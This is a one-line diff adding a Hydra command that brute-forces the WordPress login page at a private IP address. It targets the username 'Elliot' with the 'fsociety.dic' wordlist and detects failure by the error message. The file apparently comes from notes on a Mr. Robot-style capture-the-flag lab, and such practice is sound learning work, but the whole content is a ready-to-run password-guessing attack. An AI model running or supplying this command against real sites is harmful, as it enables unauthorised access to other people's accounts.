@@ -1,0 +1,1 @@
+hydra -l Elliot -P fsociety.dic 10.48.140.32 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&submit=Login:F=The password you entered for the username Elliot is incorrect"
